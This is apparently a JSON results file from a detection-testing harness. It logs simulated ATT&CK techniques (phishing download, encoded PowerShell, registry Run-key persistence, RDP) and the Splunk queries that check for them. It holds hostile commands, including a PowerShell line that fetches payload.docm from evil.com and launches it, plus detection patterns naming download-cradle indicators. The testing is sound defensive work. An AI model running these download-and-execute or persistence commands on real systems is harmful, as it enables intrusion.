{
  "metadata": {
    "generated_at": "2025-11-20T21:17:23.698296",
    "total_tests": 8,
    "total_passed": 4,
    "total_failed": 4,
    "detection_rate": 50.0
  },
  "test_results": [
    {
      "test_id": "T1566.001_detection_test",
      "ttp_id": "T1566.001",
      "tactic": "Initial Access",
      "attack": {
        "command": "powershell -c \"Invoke-WebRequest -Uri 'http://evil.com/payload.docm' -OutFile 'C:\\Users\\Public\\Documents\\invoice.docm'; Start-Process -FilePath 'C:\\Users\\Public\\Documents\\invoice.docm'\"",
        "description": "Simulate Spearphishing with a Malicious Macro-Enabled Document",
        "execution": {
          "timestamp": "2025-11-20T21:14:54.669166",
          "command": "powershell -c \"Invoke-WebRequest -Uri 'http://evil.com/payload.docm' -OutFile 'C:\\Users\\Public\\Documents\\invoice.docm'; Start-Process -FilePath 'C:\\Users\\Public\\Documents\\invoice.docm'\"",
          "status": "error",
          "output": "",
          "error": "-c : The term '-c' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of \nthe name, or if a path was included, verify that the path is correct and try again.\nAt line:1 char:1\n+ -c \"Invoke-WebRequest -Uri 'http://evil.com/payload.docm' -OutFile 'C ...\n+ ~~\n    + CategoryInfo          : ObjectNotFound: (-c:String) [], CommandNotFoundException\n    + FullyQualifiedErrorId : CommandNotFoundException"
        }
      },
      "detection": {
        "query": "index=* sourcetype=\"WinEventLog:Security\" | search ((Parent_Process_Name=\"*\\WINWORD.EXE\" OR Parent_Process_Name=\"*\\EXCEL.EXE\" OR Parent_Process_Name=\"*\\POWERPNT.EXE\" OR Parent_Process_Name=\"*\\OUTLOOK.EXE\") AND (New_Process_Name=\"*\\cmd.exe\" OR New_Process_Name=\"*\\powershell.exe\" OR New_Process_Name=\"*\\rundll32.exe\" OR New_Process_Name=\"*\\regsvr32.exe\" OR New_Process_Name=\"*\\mshta.exe\") AND (Process_Command_Line=\"*powershell.exe -enc*\" OR Process_Command_Line=\"*cmd.exe /c start*\" OR Process_Command_Line=\"*rundll32.exe javascript:*\" OR Process_Command_Line=\"*regsvr32.exe /s /i:*\" OR Process_Command_Line=\"*mshta.exe javascript:*\")) NOT ((Process_Command_Line=\"*\\\"C:\\Program Files\\Microsoft Office\\\"*\" OR Process_Command_Line=\"*\\\"C:\\Program Files (x86)\\Microsoft Office\\\"*\" OR Process_Command_Line=\"*\\AppData\\Local\\Microsoft\\Windows\\INetCache*\" OR Process_Command_Line=\"*\\AppData\\Local\\Temp*\") AND (New_Process_Name=\"*\\cmd.exe\" OR New_Process_Name=\"*\\powershell.exe\" OR New_Process_Name=\"*\\rundll32.exe\" OR New_Process_Name=\"*\\regsvr32.exe\" OR New_Process_Name=\"*\\mshta.exe\") AND (Parent_Process_Name=\"*\\WINWORD.EXE\" OR Parent_Process_Name=\"*\\EXCEL.EXE\" OR Parent_Process_Name=\"*\\POWERPNT.EXE\" OR Parent_Process_Name=\"*\\OUTLOOK.EXE\")) | table _time, ComputerName, New_Process_Name, Parent_Process_Name, Process_Command_Line, Process_ID, Subject_User_Name",
        "description": "Phishing Activity Detected via NLP Pattern Matching (Lazarus Group)",
        "query_result": {
          "status": "success",
          "detected": false,
          "event_count": 0,
          "timestamp": "2025-11-20T21:15:06.608187",
          "results": []
        }
      },
      "evaluation": {
        "detected": false,
        "status": "FAIL",
        "confidence": 0.0,
        "timestamp": "2025-11-20T21:15:19.149097",
        "notes": "Attack simulation + Query execution for T1566.001"
      }
    },
    {
      "test_id": "T1566.001_detection_test",
      "ttp_id": "T1566.001",
      "tactic": "Initial Access",
      "attack": {
        "command": "powershell -c \"Invoke-WebRequest -Uri 'https://tinyurl.com/y8888888' -OutFile 'C:\\Users\\Public\\Documents\\phish_report.html'; Start-Process -FilePath 'C:\\Users\\Public\\Documents\\phish_report.html'\"",
        "description": "Simulate Spearphishing with a Link to a Credential Harvesting Site",
        "execution": {
          "timestamp": "2025-11-20T21:15:19.150329",
          "command": "powershell -c \"Invoke-WebRequest -Uri 'https://tinyurl.com/y8888888' -OutFile 'C:\\Users\\Public\\Documents\\phish_report.html'; Start-Process -FilePath 'C:\\Users\\Public\\Documents\\phish_report.html'\"",
          "status": "error",
          "output": "",
          "error": "-c : The term '-c' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of \nthe name, or if a path was included, verify that the path is correct and try again.\nAt line:1 char:1\n+ -c \"Invoke-WebRequest -Uri 'https://tinyurl.com/y8888888' -OutFile 'C ...\n+ ~~\n    + CategoryInfo          : ObjectNotFound: (-c:String) [], CommandNotFoundException\n    + FullyQualifiedErrorId : CommandNotFoundException"
        }
      },
      "detection": {
        "query": "index=* sourcetype=\"WinEventLog:Security\" | search ((Parent_Process_Name=\"*\\WINWORD.EXE\" OR Parent_Process_Name=\"*\\EXCEL.EXE\" OR Parent_Process_Name=\"*\\POWERPNT.EXE\" OR Parent_Process_Name=\"*\\OUTLOOK.EXE\") AND (New_Process_Name=\"*\\cmd.exe\" OR New_Process_Name=\"*\\powershell.exe\" OR New_Process_Name=\"*\\rundll32.exe\" OR New_Process_Name=\"*\\regsvr32.exe\" OR New_Process_Name=\"*\\mshta.exe\") AND (Process_Command_Line=\"*powershell.exe -enc*\" OR Process_Command_Line=\"*cmd.exe /c start*\" OR Process_Command_Line=\"*rundll32.exe javascript:*\" OR Process_Command_Line=\"*regsvr32.exe /s /i:*\" OR Process_Command_Line=\"*mshta.exe javascript:*\")) NOT ((Process_Command_Line=\"*\\\"C:\\Program Files\\Microsoft Office\\\"*\" OR Process_Command_Line=\"*\\\"C:\\Program Files (x86)\\Microsoft Office\\\"*\" OR Process_Command_Line=\"*\\AppData\\Local\\Microsoft\\Windows\\INetCache*\" OR Process_Command_Line=\"*\\AppData\\Local\\Temp*\") AND (New_Process_Name=\"*\\cmd.exe\" OR New_Process_Name=\"*\\powershell.exe\" OR New_Process_Name=\"*\\rundll32.exe\" OR New_Process_Name=\"*\\regsvr32.exe\" OR New_Process_Name=\"*\\mshta.exe\") AND (Parent_Process_Name=\"*\\WINWORD.EXE\" OR Parent_Process_Name=\"*\\EXCEL.EXE\" OR Parent_Process_Name=\"*\\POWERPNT.EXE\" OR Parent_Process_Name=\"*\\OUTLOOK.EXE\")) | table _time, ComputerName, New_Process_Name, Parent_Process_Name, Process_Command_Line, Process_ID, Subject_User_Name",
        "description": "Phishing Activity Detected via NLP Pattern Matching (Lazarus Group)",
        "query_result": {
          "status": "success",
          "detected": false,
          "event_count": 0,
          "timestamp": "2025-11-20T21:15:21.408357",
          "results": []
        }
      },
      "evaluation": {
        "detected": false,
        "status": "FAIL",
        "confidence": 0.0,
        "timestamp": "2025-11-20T21:15:34.069069",
        "notes": "Attack simulation + Query execution for T1566.001"
      }
    },
    {
      "test_id": "T1059.001_detection_test",
      "ttp_id": "T1059.001",
      "tactic": "Execution",
      "attack": {
        "command": "powershell -c \"Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/mitre/attack-navigator/master/layers/example.json' -OutFile 'C:\\Users\\Public\\example.json'\"",
        "description": "Download and Execute a Simple Script from the Internet (Invoke-WebRequest)",
        "execution": {
          "timestamp": "2025-11-20T21:15:34.070053",
          "command": "powershell -c \"Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/mitre/attack-navigator/master/layers/example.json' -OutFile 'C:\\Users\\Public\\example.json'\"",
          "status": "error",
          "output": "",
          "error": "-c : The term '-c' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of \nthe name, or if a path was included, verify that the path is correct and try again.\nAt line:1 char:1\n+ -c \"Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/mitre/a ...\n+ ~~\n    + CategoryInfo          : ObjectNotFound: (-c:String) [], CommandNotFoundException\n    + FullyQualifiedErrorId : CommandNotFoundException"
        }
      },
      "detection": {
        "query": "index=* sourcetype=\"WinEventLog:Security\" | search New_Process_Name=\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" AND (Process_Command_Line=\"*-enc *\" OR Process_Command_Line=\"*Invoke-WebRequest*\" OR Process_Command_Line=\"*IEX (New-Object Net.WebClient).DownloadString*\" OR Process_Command_Line=\"*powershell.exe -nop -w hidden -c*\" OR Process_Command_Line=\"*powershell.exe -ep bypass*\" OR Process_Command_Line=\"*Invoke-Expression*\" OR Process_Command_Line=\"*cmd.exe /c powershell*\" OR Process_Command_Line=\"*powershell.exe -ExecutionPolicy Bypass*\") | table _time, ComputerName, New_Process_Name, Parent_Process_Name, Process_Command_Line, Process_ID, Subject_User_Name",
        "description": "Lazarus Group PowerShell Activity - Mimikatz Indicators",
        "query_result": {
          "status": "success",
          "detected": false,
          "event_count": 0,
          "timestamp": "2025-11-20T21:15:35.509492",
          "results": []
        }
      },
      "evaluation": {
        "detected": false,
        "status": "FAIL",
        "confidence": 0.0,
        "timestamp": "2025-11-20T21:15:48.073495",
        "notes": "Attack simulation + Query execution for T1059.001"
      }
    },
    {
      "test_id": "T1059.001_detection_test",
      "ttp_id": "T1059.001",
      "tactic": "Execution",
      "attack": {
        "command": "powershell -EncodedCommand \"UwBlAHQALQBVAHMAZQByAFEAdQBhAGwAaQB0AHkAIABTAHQAYQB0AHUAcwAgAC0AUABhAHMAcwB3AG8AcgBkACAAIgB0AGUAcwB0ACIA\"",
        "description": "Base64 Encoded PowerShell Command (Simple Echo)",
        "execution": {
          "timestamp": "2025-11-20T21:15:48.074501",
          "command": "powershell -EncodedCommand \"UwBlAHQALQBVAHMAZQByAFEAdQBhAGwAaQB0AHkAIABTAHQAYQB0AHUAcwAgAC0AUABhAHMAcwB3AG8AcgBkACAAIgB0AGUAcwB0ACIA\"",
          "status": "error",
          "output": "",
          "error": "-EncodedCommand : The term '-EncodedCommand' is not recognized as the name of a cmdlet, function, script file, or operable \nprogram. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.\nAt line:1 char:1\n+ -EncodedCommand \"UwBlAHQALQBVAHMAZQByAFEAdQBhAGwAaQB0AHkAIABTAHQAYQB0 ...\n+ ~~~~~~~~~~~~~~~\n    + CategoryInfo          : ObjectNotFound: (-EncodedCommand:String) [], CommandNotFoundException\n    + FullyQualifiedErrorId : CommandNotFoundException"
        }
      },
      "detection": {
        "query": "index=* sourcetype=\"WinEventLog:Security\" | search New_Process_Name=\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" AND (Process_Command_Line=\"*-enc *\" OR Process_Command_Line=\"*Invoke-WebRequest*\" OR Process_Command_Line=\"*IEX (New-Object Net.WebClient).DownloadString*\" OR Process_Command_Line=\"*powershell.exe -nop -w hidden -c*\" OR Process_Command_Line=\"*powershell.exe -ep bypass*\" OR Process_Command_Line=\"*Invoke-Expression*\" OR Process_Command_Line=\"*cmd.exe /c powershell*\" OR Process_Command_Line=\"*powershell.exe -ExecutionPolicy Bypass*\") | table _time, ComputerName, New_Process_Name, Parent_Process_Name, Process_Command_Line, Process_ID, Subject_User_Name",
        "description": "Lazarus Group PowerShell Activity - Mimikatz Indicators",
        "query_result": {
          "status": "success",
          "detected": false,
          "event_count": 0,
          "timestamp": "2025-11-20T21:15:49.327507",
          "results": []
        }
      },
      "evaluation": {
        "detected": false,
        "status": "FAIL",
        "confidence": 0.0,
        "timestamp": "2025-11-20T21:16:02.021912",
        "notes": "Attack simulation + Query execution for T1059.001"
      }
    },
    {
      "test_id": "T1547.001_detection_test",
      "ttp_id": "T1547.001",
      "tactic": "Persistence",
      "attack": {
        "command": "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"NotepadStartup\" /t REG_SZ /d \"C:\\Windows\\System32\\notepad.exe\" /f",
        "description": "Create Registry Run Key for Notepad.exe",
        "execution": {
          "timestamp": "2025-11-20T21:16:02.022962",
          "command": "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"NotepadStartup\" /t REG_SZ /d \"C:\\Windows\\System32\\notepad.exe\" /f",
          "status": "success",
          "output": "The operation completed successfully.",
          "error": ""
        }
      },
      "detection": {
        "query": "index=* sourcetype=\"WinEventLog:Security\" | search (New_Process_Name=\"*\\reg.exe\" AND (Process_Command_Line=\"*ADD*\" OR Process_Command_Line=\"*HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run*\" OR Process_Command_Line=\"*/v*\" OR Process_Command_Line=\"*/t*\" OR Process_Command_Line=\"*/d*\")) NOT ((Process_Command_Line=\"*\\\"C:\\Program Files\\\\\"*\" OR Process_Command_Line=\"*\\\"C:\\Windows\\\\\"*\" OR Process_Command_Line=\"*\\\"C:\\ProgramData\\\\\"*\" OR Process_Command_Line=\"*\\\"C:\\Users\\Public\\\\\"*\" OR Process_Command_Line=\"*\\\"C:\\Users\\Default\\\\\"*\" OR Process_Command_Line=\"*\\\"C:\\Users\\All Users\\\\\"*\" OR Process_Command_Line=\"*\\\"C:\\Program Files (x86)\\*\") AND ((Process_Command_Line LIKE \"\"C:\\\\Program Files\\\\.*\\\\.*\\\\.*.exe\" /d\") OR (Process_Command_Line LIKE \"\"C:\\\\Program Files (x86)\\\\.*\\\\.*\\\\.*.exe\" /d\"))) | table _time, ComputerName, New_Process_Name, Parent_Process_Name, Process_Command_Line, Process_ID, Subject_User_Name",
        "description": "Suspicious Registry Run Key Creation via NLP Pattern Matching",
        "query_result": {
          "status": "success",
          "detected": true,
          "event_count": 1,
          "timestamp": "2025-11-20T21:16:02.457374",
          "results": [
            {
              "_time": "2025-11-20T21:16:02.000+07:00",
              "ComputerName": "DESKTOP-MGBT7L3",
              "New_Process_Name": "C:\\Windows\\System32\\reg.exe",
              "Process_Command_Line": "reg  add \\\"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\\" /v \\\"NotepadStartup\\\" /t REG_SZ /d \\\"C:\\Windows\\System32\\notepad.exe\\\" /f"
            }
          ]
        }
      },
      "evaluation": {
        "detected": true,
        "status": "PASS",
        "confidence": 0.85,
        "timestamp": "2025-11-20T21:16:14.892948",
        "notes": "Attack simulation + Query execution for T1547.001"
      }
    },
    {
      "test_id": "T1547.001_detection_test",
      "ttp_id": "T1547.001",
      "tactic": "Persistence",
      "attack": {
        "command": "powershell -c \"Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'MyStartupScript' -Value 'powershell -ExecutionPolicy Bypass -File \\'C:\\Temp\\startup_script.ps1\\''\"",
        "description": "Create Registry Run Key for a PowerShell Script",
        "execution": {
          "timestamp": "2025-11-20T21:16:14.894139",
          "command": "powershell -c \"Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'MyStartupScript' -Value 'powershell -ExecutionPolicy Bypass -File \\'C:\\Temp\\startup_script.ps1\\''\"",
          "status": "error",
          "output": "",
          "error": "-c : The term '-c' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of \nthe name, or if a path was included, verify that the path is correct and try again.\nAt line:1 char:1\n+ -c \"Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentV ...\n+ ~~\n    + CategoryInfo          : ObjectNotFound: (-c:String) [], CommandNotFoundException\n    + FullyQualifiedErrorId : CommandNotFoundException"
        }
      },
      "detection": {
        "query": "index=* sourcetype=\"WinEventLog:Security\" | search (New_Process_Name=\"*\\reg.exe\" AND (Process_Command_Line=\"*ADD*\" OR Process_Command_Line=\"*HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run*\" OR Process_Command_Line=\"*/v*\" OR Process_Command_Line=\"*/t*\" OR Process_Command_Line=\"*/d*\")) NOT ((Process_Command_Line=\"*\\\"C:\\Program Files\\\\\"*\" OR Process_Command_Line=\"*\\\"C:\\Windows\\\\\"*\" OR Process_Command_Line=\"*\\\"C:\\ProgramData\\\\\"*\" OR Process_Command_Line=\"*\\\"C:\\Users\\Public\\\\\"*\" OR Process_Command_Line=\"*\\\"C:\\Users\\Default\\\\\"*\" OR Process_Command_Line=\"*\\\"C:\\Users\\All Users\\\\\"*\" OR Process_Command_Line=\"*\\\"C:\\Program Files (x86)\\*\") AND ((Process_Command_Line LIKE \"\"C:\\\\Program Files\\\\.*\\\\.*\\\\.*.exe\" /d\") OR (Process_Command_Line LIKE \"\"C:\\\\Program Files (x86)\\\\.*\\\\.*\\\\.*.exe\" /d\"))) | table _time, ComputerName, New_Process_Name, Parent_Process_Name, Process_Command_Line, Process_ID, Subject_User_Name",
        "description": "Suspicious Registry Run Key Creation via NLP Pattern Matching",
        "query_result": {
          "status": "success",
          "detected": true,
          "event_count": 1,
          "timestamp": "2025-11-20T21:16:18.160181",
          "results": [
            {
              "_time": "2025-11-20T21:16:02.000+07:00",
              "ComputerName": "DESKTOP-MGBT7L3",
              "New_Process_Name": "C:\\Windows\\System32\\reg.exe",
              "Process_Command_Line": "reg  add \\\"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\\" /v \\\"NotepadStartup\\\" /t REG_SZ /d \\\"C:\\Windows\\System32\\notepad.exe\\\" /f"
            }
          ]
        }
      },
      "evaluation": {
        "detected": true,
        "status": "PASS",
        "confidence": 0.85,
        "timestamp": "2025-11-20T21:16:30.709822",
        "notes": "Attack simulation + Query execution for T1547.001"
      }
    },
    {
      "test_id": "T1021.001_detection_test",
      "ttp_id": "T1021.001",
      "tactic": "Lateral Movement",
      "attack": {
        "command": "mstsc /v:127.0.0.1 /admin",
        "description": "Establish RDP Connection to a Localhost",
        "execution": {
          "timestamp": "2025-11-20T21:16:30.715980",
          "command": "mstsc /v:127.0.0.1 /admin",
          "status": "success",
          "output": "",
          "error": ""
        }
      },
      "detection": {
        "query": "index=* sourcetype=\"WinEventLog:Security\" | search ((Process_Command_Line=\"*mstsc.exe*\" OR Process_Command_Line=\"*Remote Desktop Connection*\" OR Process_Command_Line=\"*/v:*\" OR Process_Command_Line=\"*/admin*\" OR Process_Command_Line=\"*/console*\") AND New_Process_Name=\"*mstsc.exe\") NOT ((Process_Command_Line=\"*\\\"C:\\Program Files\\Remote Desktop Connection\\mstsc.exe\\\"*\" OR Process_Command_Line=\"*\\\"C:\\Windows\\System32\\mstsc.exe\\\"*\") AND (Parent_Process_Name=\"*explorer.exe*\" OR Parent_Process_Name=\"*svchost.exe*\" OR Parent_Process_Name=\"*winlogon.exe*\") AND Subject_User_Name=\"NT AUTHORITY\\SYSTEM\") | table _time, ComputerName, New_Process_Name, Parent_Process_Name, Process_Command_Line, Process_ID, Subject_User_Name",
        "description": "Remote Desktop Protocol Activity Detected via NLP Pattern Matching",
        "query_result": {
          "status": "success",
          "detected": true,
          "event_count": 1,
          "timestamp": "2025-11-20T21:16:47.984918",
          "results": [
            {
              "_time": "2025-11-20T21:16:30.000+07:00",
              "ComputerName": "DESKTOP-MGBT7L3",
              "New_Process_Name": "C:\\Windows\\System32\\mstsc.exe",
              "Process_Command_Line": "mstsc  /v:127.0.0.1 /admin"
            }
          ]
        }
      },
      "evaluation": {
        "detected": true,
        "status": "PASS",
        "confidence": 0.85,
        "timestamp": "2025-11-20T21:17:00.517718",
        "notes": "Attack simulation + Query execution for T1021.001"
      }
    },
    {
      "test_id": "T1021.001_detection_test",
      "ttp_id": "T1021.001",
      "tactic": "Lateral Movement",
      "attack": {
        "command": "cmdkey /generic:127.0.0.1 /user:testuser /pass:P@sswOrd123 && mstsc /v:127.0.0.1",
        "description": "RDP Connection with Specified Credentials",
        "execution": {
          "timestamp": "2025-11-20T21:17:00.518885",
          "command": "cmdkey /generic:127.0.0.1 /user:testuser /pass:P@sswOrd123 && mstsc /v:127.0.0.1",
          "status": "success",
          "output": "CMDKEY: Credential added successfully.",
          "error": ""
        }
      },
      "detection": {
        "query": "index=* sourcetype=\"WinEventLog:Security\" | search ((Process_Command_Line=\"*mstsc.exe*\" OR Process_Command_Line=\"*Remote Desktop Connection*\" OR Process_Command_Line=\"*/v:*\" OR Process_Command_Line=\"*/admin*\" OR Process_Command_Line=\"*/console*\") AND New_Process_Name=\"*mstsc.exe\") NOT ((Process_Command_Line=\"*\\\"C:\\Program Files\\Remote Desktop Connection\\mstsc.exe\\\"*\" OR Process_Command_Line=\"*\\\"C:\\Windows\\System32\\mstsc.exe\\\"*\") AND (Parent_Process_Name=\"*explorer.exe*\" OR Parent_Process_Name=\"*svchost.exe*\" OR Parent_Process_Name=\"*winlogon.exe*\") AND Subject_User_Name=\"NT AUTHORITY\\SYSTEM\") | table _time, ComputerName, New_Process_Name, Parent_Process_Name, Process_Command_Line, Process_ID, Subject_User_Name",
        "description": "Remote Desktop Protocol Activity Detected via NLP Pattern Matching",
        "query_result": {
          "status": "success",
          "detected": true,
          "event_count": 2,
          "timestamp": "2025-11-20T21:17:07.111707",
          "results": [
            {
              "_time": "2025-11-20T21:17:00.000+07:00",
              "ComputerName": "DESKTOP-MGBT7L3",
              "New_Process_Name": "C:\\Windows\\System32\\mstsc.exe",
              "Process_Command_Line": "mstsc  /v:127.0.0.1"
            },
            {
              "_time": "2025-11-20T21:16:30.000+07:00",
              "ComputerName": "DESKTOP-MGBT7L3",
              "New_Process_Name": "C:\\Windows\\System32\\mstsc.exe",
              "Process_Command_Line": "mstsc  /v:127.0.0.1 /admin"
            }
          ]
        }
      },
      "evaluation": {
        "detected": true,
        "status": "PASS",
        "confidence": 0.85,
        "timestamp": "2025-11-20T21:17:23.694396",
        "notes": "Attack simulation + Query execution for T1021.001"
      }
    }
  ],
  "summary_by_tactic": {
    "Initial Access": {
      "total": 2,
      "detected": 0,
      "passed": 0
    },
    "Execution": {
      "total": 2,
      "detected": 0,
      "passed": 0
    },
    "Persistence": {
      "total": 2,
      "detected": 2,
      "passed": 2
    },
    "Lateral Movement": {
      "total": 2,
      "detected": 2,
      "passed": 2
    }
  },
  "summary_by_ttp": {
    "T1566.001": {
      "detected": false,
      "status": "FAIL",
      "confidence": 0.0,
      "details": {
        "attack_desc": "Simulate Spearphishing with a Link to a Credential Harvesting Site",
        "detection_desc": "Phishing Activity Detected via NLP Pattern Matching (Lazarus Group)"
      }
    },
    "T1059.001": {
      "detected": false,
      "status": "FAIL",
      "confidence": 0.0,
      "details": {
        "attack_desc": "Base64 Encoded PowerShell Command (Simple Echo)",
        "detection_desc": "Lazarus Group PowerShell Activity - Mimikatz Indicators"
      }
    },
    "T1547.001": {
      "detected": true,
      "status": "PASS",
      "confidence": 0.85,
      "details": {
        "attack_desc": "Create Registry Run Key for a PowerShell Script",
        "detection_desc": "Suspicious Registry Run Key Creation via NLP Pattern Matching"
      }
    },
    "T1021.001": {
      "detected": true,
      "status": "PASS",
      "confidence": 0.85,
      "details": {
        "attack_desc": "RDP Connection with Specified Credentials",
        "detection_desc": "Remote Desktop Protocol Activity Detected via NLP Pattern Matching"
      }
    }
  }
}